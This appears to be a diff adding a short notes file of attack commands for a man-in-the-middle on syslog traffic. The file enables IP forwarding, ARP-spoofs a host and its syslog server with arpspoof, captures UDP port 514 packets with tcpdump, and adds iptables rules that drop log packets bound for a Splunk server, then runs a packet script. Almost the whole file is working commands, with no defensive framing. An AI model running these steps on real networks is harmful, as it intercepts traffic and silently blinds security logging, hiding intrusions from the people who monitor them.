@@ -1,0 +1,28 @@
+Enable IP forwarding:
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+Set up ARP MITM (open in separate windows):
+arpspoof -t <IP of host to catch traffic from> <IP of syslog server>
+arpspoof -t <IP of syslog server> <IP of host to catch traffic from>
+
+arpspoof -t 10.0.1.14 10.0.1.9
+arpspoof -t 10.0.1.9 10.0.1.14
+
+
+Capture Packets:
+tcpdump udp port 514 and host 10.0.1.14 and not arp -v
+
+
+Drop packets headed for Splunk server from target
+/sbin/iptables -A OUTPUT -p udp --destination-port 514 -j DROP
+/sbin/iptables -A FORWARD -p udp --destination-port 514 -j DROP
+
+
+Remove rules from iptables:
+/sbin/iptables -D OUTPUT -p udp --destination-port 514 -j DROP
+/sbin/iptables -D FORWARD -p udp --destination-port 514 -j DROP
+
+
+Run script:
+. /root/Desktop/packet_script.sh <target IP>
